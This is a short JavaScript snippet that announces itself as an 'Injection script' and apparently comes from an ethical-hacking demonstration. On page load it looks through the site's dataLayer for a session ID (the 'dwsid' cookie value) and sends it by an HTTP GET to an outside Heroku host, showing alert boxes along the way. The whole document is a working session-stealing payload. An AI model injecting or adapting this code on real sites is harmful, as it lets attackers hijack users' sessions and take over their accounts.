document.addEventListener("DOMContentLoaded", function(event) {
    //do work
    alert('Injection script running');
    let dwsid= '';
    let dataLayer = window.dataLayer ? window.dataLayer : null;
    if (dataLayer) {
      for (let i = 0 ; i < dataLayer.length; i++) {
        let dataEle = dataLayer[i];
        if (dataEle && dataEle.sessionID) {
          alert("Cookies dwsid:"  + dataEle.sessionID);
          dwsid = dataEle.sessionID;
          break;
        }
      }
      $.get("https://ethical-hacking-demo.herokuapp.com/cookies?dwsid=" + dwsid, function(data,status) {
        alert("Data: " + data + "\nStatus: " + status);
      })
    }
});